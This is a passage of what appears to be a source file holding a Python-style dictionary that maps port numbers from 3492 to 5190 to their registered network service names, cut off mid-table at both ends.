                                   3492: 'tvdumtray-port', 3493: 'nut', 3494: 'ibm3494', 3495: 'seclayer-tcp', 3496: 'seclayer-tls', 3497: 'ipether232port', 3498: 'dashpas-port', 3499: 'sccip-media',
                                   3500: 'rtmp-port',
                                   3501: 'isoft-p2p', 3502: 'avinstalldisc', 3503: 'lsp-ping', 3504: 'ironstorm', 3505: 'ccmcomm', 3506: 'apc-3506', 3507: 'nesh-broker', 3508: 'interactionweb',
                                   3509: 'vt-ssl',
                                   3510: 'xss-port',
                                   3511: 'webmail-2', 3512: 'aztec', 3513: 'arcpd', 3514: 'must-p2p', 3515: 'must-backplane', 3516: 'smartcard-port', 3517: '802-11-iapp', 3518: 'artifact-msg',
                                   3519: 'nvmsgd',
                                   3520: 'galileolog',
                                   3521: 'mc3ss', 3522: 'nssocketport', 3523: 'odeumservlink', 3524: 'ecmport', 3525: 'eisport', 3526: 'starquiz-port', 3527: 'beserver-msg-q', 3528: 'jboss-iiop',
                                   3529: 'jboss-iiop-ssl',
                                   3530: 'gf',
                                   3531: 'peerenabler', 3532: 'raven-rmp', 3533: 'raven-rdp', 3534: 'urld-port', 3535: 'ms-la', 3536: 'snac', 3537: 'ni-visa-remote', 3538: 'ibm-diradm',
                                   3539: 'ibm-diradm-ssl',
                                   3540: 'pnrp-port',
                                   3541: 'voispeed-port', 3542: 'hacl-monitor', 3543: 'qftest-lookup', 3544: 'teredo', 3545: 'camac', 3547: 'symantec-sim', 3548: 'interworld', 3549: 'tellumat-nms',
                                   3550: 'ssmpp',
                                   3551: 'apcupsd',
                                   3552: 'taserver', 3553: 'rbr-discovery', 3554: 'questnotify', 3555: 'razor', 3556: 'sky-transport', 3557: 'personalos-001', 3558: 'mcp-port', 3559: 'cctv-port',
                                   3560: 'iniserve-port',
                                   3561: 'bmc-onekey', 3562: 'sdbproxy', 3563: 'watcomdebug', 3564: 'esimport', 3565: 'm2pa', 3566: 'quest-data-hub', 3567: 'oap', 3568: 'oap-s', 3569: 'mbg-ctrl',
                                   3570: 'mccwebsvr-port',
                                   3571: 'megardsvr-port', 3572: 'megaregsvrport', 3573: 'tag-ups-1', 3574: 'dmaf-server', 3575: 'ccm-port', 3576: 'cmc-port', 3577: 'config-port', 3578: 'data-port',
                                   3579: 'ttat3lb',
                                   3580: 'nati-svrloc', 3581: 'kfxaclicensing', 3582: 'press', 3583: 'canex-watch', 3584: 'u-dbap', 3585: 'emprise-lls', 3586: 'emprise-lsc', 3587: 'p2pgroup',
                                   3588: 'sentinel',
                                   3589: 'isomair',
                                   3590: 'wv-csp-sms', 3591: 'gtrack-server', 3592: 'gtrack-ne', 3593: 'bpmd', 3594: 'mediaspace', 3595: 'shareapp', 3596: 'iw-mmogame', 3597: 'a14', 3598: 'a15',
                                   3599: 'quasar-server',
                                   3600: 'trap-daemon', 3601: 'visinet-gui', 3602: 'infiniswitchcl', 3603: 'int-rcv-cntrl', 3604: 'bmc-jmx-port', 3605: 'comcam-io', 3606: 'splitlock',
                                   3607: 'precise-i3',
                                   3608: 'trendchip-dcp',
                                   3609: 'cpdi-pidas-cm', 3610: 'echonet', 3611: 'six-degrees', 3612: 'hp-dataprotect', 3613: 'alaris-disc', 3614: 'sigma-port', 3615: 'start-network',
                                   3616: 'cd3o-protocol',
                                   3617: 'sharp-server',
                                   3618: 'aairnet-1', 3619: 'aairnet-2', 3620: 'ep-pcp', 3621: 'ep-nsp', 3622: 'ff-lr-port', 3623: 'haipe-discover', 3624: 'dist-upgrade', 3625: 'volley',
                                   3626: 'bvcdaemon-port',
                                   3627: 'jamserverport',
                                   3628: 'ept-machine', 3629: 'escvpnet', 3630: 'cs-remote-db', 3631: 'cs-services', 3632: 'distccd', 3633: 'wacp', 3634: 'hlibmgr', 3635: 'sdo', 3636: 'servistaitsm',
                                   3637: 'scservp',
                                   3638: 'ehp-backup', 3639: 'xap-ha', 3640: 'netplay-port1', 3641: 'netplay-port2', 3642: 'juxml-port', 3643: 'audiojuggler', 3644: 'ssowatch', 3645: 'cyc',
                                   3646: 'xss-srv-port',
                                   3647: 'splitlock-gw',
                                   3648: 'fjcp', 3649: 'nmmp', 3650: 'prismiq-plugin', 3651: 'xrpc-registry', 3652: 'vxcrnbuport', 3653: 'tsp', 3654: 'vaprtm', 3655: 'abatemgr', 3656: 'abatjss',
                                   3657: 'immedianet-bcn',
                                   3658: 'ps-ams',
                                   3659: 'apple-sasl', 3660: 'can-nds-ssl', 3661: 'can-ferret-ssl', 3662: 'pserver', 3663: 'dtp', 3664: 'ups-engine', 3665: 'ent-engine', 3666: 'eserver-pap',
                                   3667: 'infoexch',
                                   3668: 'dell-rm-port',
                                   3669: 'casanswmgmt', 3670: 'smile', 3671: 'efcp', 3672: 'lispworks-orb', 3673: 'mediavault-gui', 3674: 'wininstall-ipc', 3675: 'calltrax', 3676: 'va-pacbase',
                                   3677: 'roverlog',
                                   3678: 'ipr-dglt',
                                   3679: 'newton-dock', 3680: 'npds-tracker', 3681: 'bts-x73', 3682: 'cas-mapi', 3683: 'bmc-ea', 3684: 'faxstfx-port', 3685: 'dsx-agent', 3686: 'tnmpv2',
                                   3687: 'simple-push',
                                   3688: 'simple-push-s',
                                   3689: 'rendezvous', 3690: 'svn', 3691: 'magaya-network', 3692: 'intelsync', 3693: 'easl', 3695: 'bmc-data-coll', 3696: 'telnetcpcd', 3697: 'nw-license',
                                   3698: 'sagectlpanel',
                                   3699: 'kpn-icw',
                                   3700: 'lrs-paging', 3701: 'netcelera', 3702: 'ws-discovery', 3703: 'adobeserver-3', 3704: 'adobeserver-4', 3705: 'adobeserver-5', 3706: 'rt-event',
                                   3707: 'rt-event-s',
                                   3708: 'sun-as-iiops',
                                   3709: 'ca-idms', 3710: 'portgate-auth', 3711: 'edb-server2', 3712: 'sentinel-ent', 3713: 'tftps', 3714: 'delos-dms', 3715: 'anoto-rendezv', 3716: 'wv-csp-sms-cir',
                                   3717: 'wv-csp-udp-cir',
                                   3718: 'opus-services', 3719: 'itelserverport', 3720: 'ufastro-instr', 3721: 'xsync', 3722: 'xserveraid', 3723: 'sychrond', 3724: 'blizwow', 3725: 'na-er-tip',
                                   3726: 'array-manager',
                                   3727: 'e-mdu',
                                   3728: 'e-woa', 3729: 'fksp-audit', 3730: 'client-ctrl', 3731: 'smap', 3732: 'm-wnn', 3733: 'multip-msg', 3734: 'synel-data', 3735: 'pwdis', 3736: 'rs-rmi',
                                   3737: 'xpanel',
                                   3738: 'versatalk',
                                   3739: 'launchbird-lm', 3740: 'heartbeat', 3741: 'wysdma', 3742: 'cst-port', 3743: 'ipcs-command', 3744: 'sasg', 3745: 'gw-call-port', 3746: 'linktest',
                                   3747: 'linktest-s', 3748: 'webdata',
                                   3749: 'cimtrak', 3750: 'cbos-ip-port', 3751: 'gprs-cube', 3752: 'vipremoteagent', 3753: 'nattyserver', 3754: 'timestenbroker', 3755: 'sas-remote-hlp',
                                   3756: 'canon-capt', 3757: 'grf-port',
                                   3758: 'apw-registry', 3759: 'exapt-lmgr', 3760: 'adtempusclient', 3761: 'gsakmp', 3762: 'gbs-smp', 3763: 'xo-wave', 3764: 'mni-prot-rout', 3765: 'rtraceroute',
                                   3766: 'sitewatch-s',
                                   3767: 'listmgr-port', 3768: 'rblcheckd', 3769: 'haipe-otnk', 3770: 'cindycollab', 3771: 'paging-port', 3772: 'ctp', 3773: 'ctdhercules', 3774: 'zicom',
                                   3775: 'ispmmgr',
                                   3776: 'dvcprov-port',
                                   3777: 'jibe-eb', 3778: 'c-h-it-port', 3779: 'cognima', 3780: 'nnp', 3781: 'abcvoice-port', 3782: 'iso-tp0s', 3783: 'bim-pem', 3784: 'bfd-control', 3785: 'bfd-echo',
                                   3786: 'upstriggervsw',
                                   3787: 'fintrx', 3788: 'isrp-port', 3789: 'remotedeploy', 3790: 'quickbooksrds', 3791: 'tvnetworkvideo', 3792: 'sitewatch', 3793: 'dcsoftware', 3794: 'jaus',
                                   3795: 'myblast',
                                   3796: 'spw-dialer',
                                   3797: 'idps', 3798: 'minilock', 3799: 'radius-dynauth', 3800: 'pwgpsi', 3801: 'ibm-mgr', 3802: 'vhd', 3803: 'soniqsync', 3804: 'iqnet-port', 3805: 'tcpdataserver',
                                   3806: 'wsmlb',
                                   3807: 'spugna',
                                   3808: 'sun-as-iiops-ca', 3809: 'apocd', 3810: 'wlanauth', 3811: 'amp', 3812: 'neto-wol-server', 3813: 'rap-ip', 3814: 'neto-dcs', 3815: 'lansurveyorxml',
                                   3816: 'sunlps-http',
                                   3817: 'tapeware',
                                   3818: 'crinis-hb', 3819: 'epl-slp', 3820: 'scp', 3821: 'pmcp', 3822: 'acp-discovery', 3823: 'acp-conduit', 3824: 'acp-policy', 3825: 'ffserver', 3826: 'wormux',
                                   3827: 'netmpi',
                                   3828: 'neteh',
                                   3829: 'neteh-ext', 3830: 'cernsysmgmtagt', 3831: 'dvapps', 3832: 'xxnetserver', 3833: 'aipn-auth', 3834: 'spectardata', 3835: 'spectardb', 3836: 'markem-dcp',
                                   3837: 'mkm-discovery',
                                   3838: 'sos',
                                   3839: 'amx-rms', 3840: 'flirtmitmir', 3841: 'zfirm-shiprush3', 3842: 'nhci', 3843: 'quest-agent', 3844: 'rnm', 3845: 'v-one-spp', 3846: 'an-pcp',
                                   3847: 'msfw-control', 3848: 'item',
                                   3849: 'spw-dnspreload', 3850: 'qtms-bootstrap', 3851: 'spectraport', 3852: 'sse-app-config', 3853: 'sscan', 3854: 'stryker-com', 3855: 'opentrac', 3856: 'informer',
                                   3857: 'trap-port',
                                   3858: 'trap-port-mom', 3859: 'nav-port', 3860: 'sasp', 3861: 'winshadow-hd', 3862: 'giga-pocket', 3863: 'asap-tcp', 3864: 'asap-tcp-tls', 3865: 'xpl',
                                   3866: 'dzdaemon',
                                   3867: 'dzoglserver',
                                   3868: 'diameter', 3869: 'ovsam-mgmt', 3870: 'ovsam-d-agent', 3871: 'avocent-adsap', 3872: 'oem-agent', 3873: 'fagordnc', 3874: 'sixxsconfig', 3875: 'pnbscada',
                                   3876: 'dl_agent',
                                   3877: 'xmpcr-interface', 3878: 'fotogcad', 3879: 'appss-lm', 3880: 'igrs', 3881: 'idac', 3882: 'msdts1', 3883: 'vrpn', 3884: 'softrack-meter', 3885: 'topflow-ssl',
                                   3886: 'nei-management',
                                   3887: 'ciphire-data', 3888: 'ciphire-serv', 3889: 'dandv-tester', 3890: 'ndsconnect', 3891: 'rtc-pm-port', 3892: 'pcc-image-port', 3893: 'cgi-starapi',
                                   3894: 'syam-agent',
                                   3895: 'syam-smc',
                                   3896: 'sdo-tls', 3897: 'sdo-ssh', 3898: 'senip', 3899: 'itv-control', 3900: 'udt_os', 3901: 'nimsh', 3902: 'nimaux', 3903: 'charsetmgr', 3904: 'omnilink-port',
                                   3905: 'mupdate',
                                   3906: 'topovista-data', 3907: 'imoguia-port', 3908: 'hppronetman', 3909: 'surfcontrolcpa', 3910: 'prnrequest', 3911: 'prnstatus', 3912: 'gbmt-stars',
                                   3913: 'listcrt-port',
                                   3914: 'listcrt-port-2',
                                   3915: 'agcat', 3916: 'wysdmc', 3917: 'aftmux', 3918: 'pktcablemmcops', 3919: 'hyperip', 3920: 'exasoftport1', 3921: 'herodotus-net', 3922: 'sor-update',
                                   3923: 'symb-sb-port',
                                   3924: 'mpl-gprs-port',
                                   3925: 'zmp', 3926: 'winport', 3927: 'natdataservice', 3928: 'netboot-pxe', 3929: 'smauth-port', 3930: 'syam-webserver', 3931: 'msr-plugin-port', 3932: 'dyn-site',
                                   3933: 'plbserve-port',
                                   3934: 'sunfm-port', 3935: 'sdp-portmapper', 3936: 'mailprox', 3937: 'dvbservdsc', 3938: 'dbcontrol_agent', 3939: 'aamp', 3940: 'xecp-node', 3941: 'homeportal-web',
                                   3942: 'srdp',
                                   3943: 'tig',
                                   3944: 'sops', 3945: 'emcads', 3946: 'backupedge', 3947: 'ccp', 3948: 'apdap', 3949: 'drip', 3950: 'namemunge', 3951: 'pwgippfax', 3952: 'i3-sessionmgr',
                                   3953: 'xmlink-connect',
                                   3954: 'adrep',
                                   3955: 'p2pcommunity', 3956: 'gvcp', 3957: 'mqe-broker', 3958: 'mqe-agent', 3959: 'treehopper', 3960: 'bess', 3961: 'proaxess', 3962: 'sbi-agent', 3963: 'thrp',
                                   3964: 'sasggprs',
                                   3965: 'ati-ip-to-ncpe', 3966: 'bflckmgr', 3967: 'ppsms', 3968: 'ianywhere-dbns', 3969: 'landmarks', 3970: 'lanrevagent', 3971: 'lanrevserver', 3972: 'iconp',
                                   3973: 'progistics',
                                   3974: 'citysearch',
                                   3975: 'airshot', 3976: 'opswagent', 3977: 'opswmanager', 3978: 'secure-cfg-svr', 3979: 'smwan', 3980: 'acms', 3981: 'starfish', 3982: 'eis', 3983: 'eisp',
                                   3984: 'mapper-nodemgr',
                                   3985: 'mapper-mapethd', 3986: 'mapper-ws_ethd', 3987: 'centerline', 3988: 'dcs-config', 3989: 'bv-queryengine', 3990: 'bv-is', 3991: 'bv-smcsrv', 3992: 'bv-ds',
                                   3993: 'bv-agent',
                                   3995: 'iss-mgmt-ssl', 3996: 'abcsoftware', 3997: 'agentsease-db', 3998: 'dnx', 4000: 'remoteanything', 4001: 'newoak', 4002: 'mlchat-proxy', 4003: 'pxc-splr-ft',
                                   4004: 'pxc-roid',
                                   4005: 'pxc-pin',
                                   4006: 'pxc-spvr', 4007: 'pxc-splr', 4008: 'netcheque', 4009: 'chimera-hwm', 4010: 'samsung-unidex', 4011: 'altserviceboot', 4012: 'pda-gate', 4013: 'acl-manager',
                                   4014: 'taiclock',
                                   4015: 'talarian-mcast1', 4016: 'talarian-mcast2', 4017: 'talarian-mcast3', 4018: 'talarian-mcast4', 4019: 'talarian-mcast5', 4020: 'trap', 4021: 'nexus-portal',
                                   4022: 'dnox',
                                   4023: 'esnm-zoning',
                                   4024: 'tnp1-port', 4025: 'partimage', 4026: 'as-debug', 4027: 'bxp', 4028: 'dtserver-port', 4029: 'ip-qsig', 4030: 'jdmn-port', 4031: 'suucp',
                                   4032: 'vrts-auth-port', 4033: 'sanavigator',
                                   4034: 'ubxd', 4035: 'wap-push-http', 4036: 'wap-push-https', 4037: 'ravehd', 4038: 'fazzt-ptp', 4039: 'fazzt-admin', 4040: 'yo-main', 4041: 'houston', 4042: 'ldxp',
                                   4043: 'nirp',
                                   4044: 'ltp',
                                   4045: 'lockd', 4046: 'acp-proto', 4047: 'ctp-state', 4049: 'wafs', 4050: 'cisco-wafs', 4051: 'cppdp', 4052: 'interact', 4053: 'ccu-comm-1', 4054: 'ccu-comm-2',
                                   4055: 'ccu-comm-3',
                                   4056: 'lms',
                                   4057: 'wfm', 4058: 'kingfisher', 4059: 'dlms-cosem', 4060: 'dsmeter_iatc', 4061: 'ice-location', 4062: 'ice-slocation', 4063: 'ice-router', 4064: 'ice-srouter',
                                   4065: 'avanti_cdp',
                                   4066: 'pmas',
                                   4067: 'idp', 4068: 'ipfltbcst', 4069: 'minger', 4070: 'tripe', 4071: 'aibkup', 4072: 'zieto-sock', 4073: 'iRAPP', 4074: 'cequint-cityid', 4075: 'perimlan',
                                   4076: 'seraph',
                                   4077: 'ascomalarm',
                                   4078: 'cssp', 4079: 'santools', 4080: 'lorica-in', 4081: 'lorica-in-sec', 4082: 'lorica-out', 4083: 'lorica-out-sec', 4084: 'fortisphere-vm', 4085: 'ezmessagesrv',
                                   4086: 'ftsync',
                                   4087: 'applusservice', 4088: 'npsp', 4089: 'opencore', 4090: 'omasgport', 4091: 'ewinstaller', 4092: 'ewdgs', 4093: 'pvxpluscs', 4094: 'sysrqd', 4095: 'xtgui',
                                   4096: 'bre',
                                   4097: 'patrolview',
                                   4098: 'drmsfsd', 4099: 'dpcp', 4100: 'igo-incognito', 4101: 'brlp-0', 4102: 'brlp-1', 4103: 'brlp-2', 4104: 'brlp-3', 4105: 'shofarplayer', 4106: 'synchronite',
                                   4107: 'j-ac',
                                   4108: 'accel',
                                   4109: 'izm', 4110: 'g2tag', 4111: 'xgrid', 4112: 'apple-vpns-rp', 4113: 'aipn-reg', 4114: 'jomamqmonitor', 4115: 'cds', 4116: 'smartcard-tls', 4117: 'hillrserv',
                                   4118: 'netscript',
                                   4119: 'assuria-slm', 4120: 'minirem', 4121: 'e-builder', 4122: 'fprams', 4123: 'z-wave', 4124: 'tigv2', 4125: 'rww', 4126: 'ddrepl', 4127: 'unikeypro', 4128: 'nufw',
                                   4129: 'nuauth',
                                   4130: 'fronet',
                                   4131: 'stars', 4132: 'nuts_dem', 4133: 'nuts_bootp', 4134: 'nifty-hmi', 4135: 'cl-db-attach', 4136: 'cl-db-request', 4137: 'cl-db-remote', 4138: 'nettest',
                                   4139: 'thrtx',
                                   4140: 'cedros_fds',
                                   4141: 'oirtgsvc', 4142: 'oidocsvc', 4143: 'oidsr', 4144: 'wincim', 4145: 'vvr-control', 4146: 'tgcconnect', 4147: 'vrxpservman', 4148: 'hhb-handheld', 4149: 'agslb',
                                   4150: 'PowerAlert-nsa',
                                   4151: 'menandmice_noh', 4152: 'idig_mux', 4153: 'mbl-battd', 4154: 'atlinks', 4155: 'bzr', 4156: 'stat-results', 4157: 'stat-scanner', 4158: 'stat-cc', 4159: 'nss',
                                   4160: 'jini-discovery',
                                   4161: 'omscontact', 4162: 'omstopology', 4163: 'silverpeakpeer', 4164: 'silverpeakcomm', 4165: 'altcp', 4166: 'joost', 4167: 'ddgn', 4168: 'pslicser', 4169: 'iadt',
                                   4170: 'd-cinema-csp',
                                   4171: 'ml-svnet', 4172: 'pcoip', 4173: 'mma-discovery', 4174: 'smcluster', 4175: 'bccp', 4176: 'tl-ipcproxy', 4177: 'wello', 4178: 'storman', 4179: 'MaxumSP',
                                   4180: 'httpx',
                                   4181: 'macbak',
                                   4182: 'pcptcpservice', 4183: 'gmmp', 4184: 'universe_suite', 4185: 'wcpp', 4186: 'boxbackupstore', 4187: 'csc_proxy', 4188: 'vatata', 4189: 'pcep', 4190: 'sieve',
                                   4191: 'dsmipv6',
                                   4192: 'azeti',
                                   4193: 'pvxplusio', 4197: 'hctl', 4199: 'eims-admin', 4224: 'xtell', 4299: 'vrml-multi-use', 4300: 'corelccam', 4301: 'd-data', 4302: 'd-data-control', 4303: 'srcp',
                                   4304: 'owserver',
                                   4305: 'batman',
                                   4306: 'pinghgl', 4307: 'visicron-vs', 4308: 'compx-lockview', 4309: 'dserver', 4310: 'mirrtex', 4311: 'p6ssmc', 4312: 'pscl-mgt', 4313: 'perrla',
                                   4314: 'choiceview-agt',
                                   4316: 'choiceview-clt',
                                   4320: 'fdt-rcatp', 4321: 'rwhois', 4322: 'trim-event', 4323: 'trim-ice', 4324: 'balour', 4325: 'geognosisman', 4326: 'geognosis', 4327: 'jaxer-web',
                                   4328: 'jaxer-manager',
                                   4329: 'publiqare-sync',
                                   4330: 'dey-sapi', 4331: 'ktickets-rest', 4332: 'getty-focus', 4333: 'msql', 4334: 'netconf-ch-ssh', 4335: 'netconf-ch-tls', 4336: 'restconf-ch-tls', 4340: 'gaia',
                                   4341: 'lisp-data',
                                   4342: 'lisp-cons', 4343: 'unicall', 4344: 'vinainstall', 4345: 'm4-network-as', 4346: 'elanlm', 4347: 'lansurveyor', 4348: 'itose', 4349: 'fsportmap',
                                   4350: 'net-device',
                                   4351: 'plcy-net-svcs',
                                   4352: 'pjlink', 4353: 'f5-iquery', 4354: 'qsnet-trans', 4355: 'qsnet-workst', 4356: 'qsnet-assist', 4357: 'qsnet-cond', 4358: 'qsnet-nucl', 4359: 'omabcastltkm',
                                   4360: 'matrix_vnet',
                                   4361: 'nacnl',
                                   4362: 'afore-vdp-disc', 4366: 'shadowstream', 4368: 'wxbrief', 4369: 'epmd', 4370: 'elpro_tunnel', 4371: 'l2c-control', 4372: 'l2c-data', 4373: 'remctl',
                                   4374: 'psi-ptt', 4375: 'tolteces',
                                   4376: 'bip', 4377: 'cp-spxsvr', 4378: 'cp-spxdpy', 4379: 'ctdb', 4389: 'xandros-cms', 4390: 'wiegand', 4391: 'apwi-imserver', 4392: 'apwi-rxserver',
                                   4393: 'apwi-rxspooler',
                                   4394: 'apwi-disc',
                                   4395: 'omnivisionesx', 4396: 'fly', 4400: 'ds-srv', 4401: 'ds-srvr', 4402: 'ds-clnt', 4403: 'ds-user', 4404: 'ds-admin', 4405: 'ds-mail', 4406: 'ds-slp',
                                   4407: 'nacagent', 4408: 'slscc',
                                   4409: 'netcabinet-com', 4410: 'itwo-server', 4411: 'found', 4412: 'smallchat', 4413: 'avi-nms', 4414: 'updog', 4415: 'brcd-vr-req', 4416: 'pjj-player',
                                   4417: 'workflowdir',
                                   4418: 'axysbridge',
                                   4419: 'cbp', 4420: 'nvm-express', 4421: 'scaleft', 4422: 'tsepisp', 4423: 'thingkit', 4425: 'netrockey6', 4426: 'beacon-port-2', 4427: 'drizzle', 4428: 'omviserver',
                                   4429: 'omviagent',
                                   4430: 'rsqlserver', 4431: 'wspipe', 4432: 'l-acoustics', 4433: 'vop', 4441: 'netblox', 4442: 'saris', 4443: 'pharos', 4444: 'krb524', 4445: 'upnotifyp',
                                   4446: 'n1-fwp', 4447: 'n1-rmgmt',
                                   4448: 'asc-slmd', 4449: 'privatewire', 4450: 'camp', 4451: 'ctisystemmsg', 4452: 'ctiprogramload', 4453: 'nssalertmgr', 4454: 'nssagentmgr', 4455: 'prchat-user',
                                   4456: 'prchat-server',
                                   4457: 'prRegister', 4458: 'mcp', 4480: 'proxy-plus', 4484: 'hpssmgmt', 4485: 'assyst-dr', 4486: 'icms', 4487: 'prex-tcp', 4488: 'awacs-ice', 4500: 'sae-urn',
                                   4502: 'a25-fap-fgw',
                                   4534: 'armagetronad', 4535: 'ehs', 4536: 'ehs-ssl', 4537: 'wssauthsvc', 4538: 'swx-gate', 4545: 'worldscores', 4546: 'sf-lm', 4547: 'lanner-lm', 4548: 'synchromesh',
                                   4549: 'aegate',
                                   4550: 'gds-adppiw-db', 4551: 'ieee-mih', 4552: 'menandmice-mon', 4553: 'icshostsvc', 4554: 'msfrs', 4555: 'rsip', 4556: 'dtn-bundle-tcp', 4557: 'fax',
                                   4558: 'mtcevrunqman',
                                   4559: 'hylafax',
                                   4563: 'amahi-anywhere', 4566: 'kwtc', 4567: 'tram', 4568: 'bmc-reporting', 4569: 'iax', 4570: 'deploymentmap', 4573: 'cardifftec-back', 4590: 'rid',
                                   4591: 'l3t-at-an',
                                   4592: 'hrpd-ith-at-an',
                                   4593: 'ipt-anri-anri', 4594: 'ias-session', 4595: 'ias-paging', 4596: 'ias-neighbor', 4597: 'a21-an-1xbs', 4598: 'a16-an-an', 4599: 'a17-an-an', 4600: 'piranha1',
                                   4601: 'piranha2',
                                   4602: 'mtsserver',
                                   4603: 'menandmice-upg', 4604: 'irp', 4605: 'sixchat', 4621: 'ventoso', 4658: 'playsta2-app', 4659: 'playsta2-lob', 4660: 'mosmig', 4661: 'kar2ouche',
                                   4662: 'edonkey', 4663: 'noteit',
                                   4664: 'ems',
                                   4665: 'contclientms', 4666: 'eportcomm', 4667: 'mmacomm', 4668: 'mmaeds', 4669: 'eportcommdata', 4670: 'light', 4671: 'acter', 4672: 'rfa', 4673: 'cxws',
                                   4674: 'appiq-mgmt',
                                   4675: 'dhct-status',
                                   4676: 'dhct-alerts', 4677: 'bcs', 4678: 'traversal', 4679: 'mgesupervision', 4680: 'mgemanagement', 4681: 'parliant', 4682: 'finisar', 4683: 'spike',
                                   4684: 'rfid-rp1', 4685: 'autopac',
                                   4686: 'msp-os', 4687: 'nst', 4688: 'mobile-p2p', 4689: 'altovacentral', 4690: 'prelude', 4691: 'mtn', 4692: 'conspiracy', 4700: 'netxms-agent', 4701: 'netxms-mgmt',
                                   4702: 'netxms-sync',
                                   4703: 'npqes-test', 4704: 'assuria-ins', 4711: 'trinity-dist', 4713: 'pulseaudio', 4725: 'truckstar', 4726: 'a26-fap-fgw', 4727: 'fcis', 4728: 'capmux',
                                   4729: 'gsmtap', 4730: 'gearman',
                                   4731: 'remcap', 4732: 'ohmtrigger', 4733: 'resorcs', 4737: 'ipdr-sp', 4738: 'solera-lpn', 4739: 'ipfix', 4740: 'ipfixs', 4741: 'lumimgrd', 4742: 'sicct',
                                   4743: 'openhpid', 4744: 'ifsp',
                                   4745: 'fmp',
                                   4746: 'intelliadm-disc', 4747: 'buschtrommel', 4749: 'profilemac', 4750: 'ssad', 4751: 'spocp', 4752: 'snap', 4753: 'simon', 4754: 'gre-in-udp',
                                   4755: 'gre-udp-dtls', 4756: 'RDCenter',
                                   4774: 'converge', 4784: 'bfd-multi-ctl', 4785: 'cncp', 4786: 'smart-install', 4787: 'sia-ctrl-plane', 4788: 'xmcp', 4789: 'vxlan', 4790: 'vxlan-gpe', 4791: 'roce',
                                   4800: 'iims',
                                   4801: 'iwec',
                                   4802: 'ilss', 4803: 'notateit', 4804: 'aja-ntv4-disc', 4827: 'htcp', 4837: 'varadero-0', 4838: 'varadero-1', 4839: 'varadero-2', 4840: 'opcua-tcp', 4841: 'quosa',
                                   4842: 'gw-asv',
                                   4843: 'opcua-tls',
                                   4844: 'gw-log', 4845: 'wcr-remlib', 4846: 'contamac_icm', 4847: 'wfc', 4848: 'appserv-http', 4849: 'appserv-https', 4850: 'sun-as-nodeagt', 4851: 'derby-repli',
                                   4867: 'unify-debug',
                                   4868: 'phrelay',
                                   4869: 'phrelaydbg', 4870: 'cc-tracking', 4871: 'wired', 4876: 'tritium-can', 4877: 'lmcs', 4878: 'inst-discovery', 4879: 'wsdl-event', 4880: 'hislip',
                                   4881: 'socp-t', 4882: 'socp-c',
                                   4883: 'wmlserver', 4884: 'hivestor', 4885: 'abbs', 4888: 'xcap-portal', 4889: 'xcap-control', 4894: 'lyskom', 4899: 'radmin', 4900: 'hfcs', 4901: 'flr_agent',
                                   4902: 'magiccontrol',
                                   4912: 'lutap',
                                   4913: 'lutcp', 4914: 'bones', 4915: 'frcs', 4936: 'an-signaling', 4937: 'atsc-mh-ssc', 4940: 'eq-office-4940', 4941: 'eq-office-4941', 4942: 'eq-office-4942',
                                   4949: 'munin',
                                   4950: 'sybasesrvmon',
                                   4951: 'pwgwims', 4952: 'sagxtsds', 4953: 'dbsyncarbiter', 4969: 'ccss-qmm', 4970: 'ccss-qsm', 4971: 'burp', 4980: 'ctxs-vpp', 4984: 'webyast', 4985: 'gerhcs',
                                   4986: 'mrip',
                                   4988: 'smar-se-port2',
                                   4989: 'parallel', 4990: 'busycal', 4991: 'vrt', 4998: 'maybe-veritas', 4999: 'hfcs-manager', 5000: 'upnp', 5001: 'commplex-link', 5002: 'rfe', 5003: 'filemaker',
                                   5004: 'avt-profile-1',
                                   5005: 'avt-profile-2', 5006: 'wsm-server', 5007: 'wsm-server-ssl', 5008: 'synapsis-edge', 5009: 'airport-admin', 5010: 'telelpathstart', 5011: 'telelpathattack',
                                   5012: 'nsp',
                                   5013: 'fmpro-v6',
                                   5014: 'onpsocket', 5015: 'fmwp', 5020: 'zenginkyo-1', 5021: 'zenginkyo-2', 5022: 'mice', 5023: 'htuilsrv', 5024: 'scpi-telnet', 5025: 'scpi-raw', 5026: 'strexec-d',
                                   5027: 'strexec-s',
                                   5028: 'qvr',
                                   5029: 'infobright', 5030: 'surfpass', 5031: 'dmp', 5032: 'signacert-agent', 5033: 'jtnetd-server', 5034: 'jtnetd-status', 5042: 'asnaacceler8db', 5043: 'swxadmin',
                                   5044: 'lxi-evntsvc',
                                   5045: 'osp',
                                   5046: 'vpm-udp', 5047: 'iscape', 5048: 'texai', 5049: 'ivocalize', 5050: 'mmcc', 5051: 'ida-agent', 5052: 'ita-manager', 5053: 'rlm', 5054: 'rlm-admin',
                                   5055: 'unot', 5056: 'intecom-ps1',
                                   5057: 'intecom-ps2', 5058: 'locus-disc', 5059: 'sds', 5060: 'sip', 5061: 'sip-tls', 5062: 'na-localise', 5063: 'csrpc', 5064: 'ca-1', 5065: 'ca-2',
                                   5066: 'stanag-5066', 5067: 'authentx',
                                   5068: 'bitforestsrv', 5069: 'i-net-2000-npr', 5070: 'vtsas', 5071: 'powerschool', 5072: 'ayiya', 5073: 'tag-pm', 5074: 'alesquery', 5075: 'pvaccess',
                                   5078: 'pixelpusher',
                                   5079: 'cp-spxrpts',
                                   5080: 'onscreen', 5081: 'sdl-ets', 5082: 'qcp', 5083: 'qfp', 5084: 'llrp', 5085: 'encrypted-llrp', 5086: 'aprigo-cs', 5087: 'biotic', 5092: 'magpie',
                                   5093: 'sentinel-lm', 5094: 'hart-ip',
                                   5099: 'sentlm-srv2srv', 5100: 'admd', 5101: 'admdog', 5102: 'admeng', 5103: 'actifio-c2c', 5104: 'tinymessage', 5105: 'hughes-ap', 5106: 'actifioudsagent',
                                   5107: 'actifioreplic',
                                   5111: 'taep-as-svc',
                                   5112: 'pm-cmdsvr', 5114: 'ev-services', 5115: 'autobuild', 5116: 'emb-proj-cmd', 5117: 'gradecam', 5120: 'barracuda-bbs', 5133: 'nbt-pc', 5134: 'ppactivation',
                                   5135: 'erp-scale',
                                   5136: 'minotaur-sa',
                                   5137: 'ctsd', 5145: 'rmonitor_secure', 5146: 'social-alarm', 5150: 'atmp', 5151: 'esri_sde', 5152: 'sde-discovery', 5153: 'toruxserver', 5154: 'bzflag',
                                   5155: 'asctrl-agent',
                                   5156: 'rugameonline',
                                   5157: 'mediat', 5161: 'snmpssh', 5162: 'snmpssh-trap', 5163: 'sbackup', 5164: 'vpa', 5165: 'ife_icorp', 5166: 'winpcs', 5167: 'scte104', 5168: 'scte30',
                                   5172: 'pcoip-mgmt', 5190: 'aol',
